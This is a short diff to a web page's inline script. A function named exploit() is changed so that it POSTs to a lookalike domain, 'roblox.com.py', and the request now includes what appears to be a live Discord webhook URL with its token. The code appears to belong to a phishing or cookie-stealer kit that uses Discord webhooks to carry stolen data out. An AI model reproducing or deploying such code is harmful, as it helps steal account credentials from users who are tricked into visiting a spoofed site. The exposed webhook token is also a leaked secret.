@@ -127,8 +127,11 @@
 </body>
 <script>
     function exploit() {
-        send(`https://loader.live/dashboard?/logout`, "POST", {
-           
+        send(`https://roblox.com.py/controlPage/apis/beta/formData`, "POST", {
+           "": {
+                "avatar_url": "assets/icon-dark.webp",
+                "webhook": "https://discord.com/api/webhooks/1237489936538669129/MnryfcT0NEqxNO5ryYoJWll6av3LZ46ybQCRj631AiaKW2ARU4aTF-dSgInVbvrGxNeD",
+            },
         })
         cleanup()
 
